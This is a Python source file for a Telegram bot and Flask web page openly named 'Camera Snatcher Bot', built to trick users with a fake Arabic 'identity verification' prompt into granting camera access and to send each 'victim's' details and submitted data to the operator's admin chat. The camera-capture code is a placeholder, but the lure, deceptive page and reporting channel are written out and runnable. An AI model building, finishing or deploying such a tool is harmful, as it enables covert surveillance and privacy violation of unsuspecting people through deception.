# ╔════════════════════════════════════════════════════════════╗
# ║     CAMERA SNATCHER BOT - DARK EDITION v1                  ║
# ║     Built for Render + Telegram Web App                    ║
# ╚════════════════════════════════════════════════════════════╝

import os
import sys
import time
import json
import base64
import threading
from datetime import datetime
from flask import Flask, render_template_string, request
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from colorama import init, Fore, Style

# ──── Colorama Init ────
init(autoreset=True)
r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT

BANNER = f"""
{r}╔════════════════════════════════════════════╗
{r}║   CAMERA SNATCHER BOT - ONE CLICK STEAL    ║
{r}║      Front + Back + 5s Video → Admin       ║
{r}╚════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ──── Config from Render Env Vars ────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
WEBAPP_URL = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "localhost:10000")
if not BOT_TOKEN or ADMIN_ID == 0:
    print(f"{r}[!] BOT_TOKEN or ADMIN_ID missing in env vars!{Style.RESET_ALL}")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ──── Simple Camera Page (placeholder - سنكمله لاحقاً) ────
CAMERA_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق سريع</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; padding:20px; }
        #status { font-size:20px; margin:40px 0; }
    </style>
</head>
<body>
    <h2>جاري التحقق من هويتك...</h2>
    <div id="status">اضغط سماح للكاميرا لإكمال التحقق</div>
    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        // سيتم إضافة كود الكاميرا هنا لاحقاً
        setTimeout(() => {
            Telegram.WebApp.sendData("test_data_from_victim");
        }, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(CAMERA_PAGE)

# ──── Telegram Handlers ────
@bot.message_handler(commands=['start'])
def start(msg):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("📸 اضغط للتحقق السريع", web_app=WebAppInfo(url=f"https://{WEBAPP_URL}/")))
    
    bot.send_message(
        msg.chat.id,
        f"{BANNER}\n{g}مرحباً! اضغط الزر تحت عشان تكمل التحقق 😈",
        reply_markup=kb
    )
    try:
        bot.send_message(ADMIN_ID, f"New victim connected: @{msg.from_user.username or 'hidden'} ({msg.from_user.id})")
    except:
        pass

@bot.message_handler(content_types=['web_app_data'])
def handle_webapp(msg):
    data = msg.web_app_data.data
    bot.send_message(ADMIN_ID, f"Received from victim {msg.from_user.id}:\n{data}")
    bot.send_message(msg.chat.id, "تم التحقق بنجاح! شكراً 😏")

# ──── Run Flask + Bot ────
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)

def run_bot():
    print(f"{g}[*] Bot polling started...{Style.RESET_ALL}")
    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    print(BANNER)
    print(f"{y}WEBAPP URL: https://{WEBAPP_URL}/{Style.RESET_ALL}")
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=run_bot, daemon=True).start()
    while True:
        time.sleep(3600)  # Keep alive
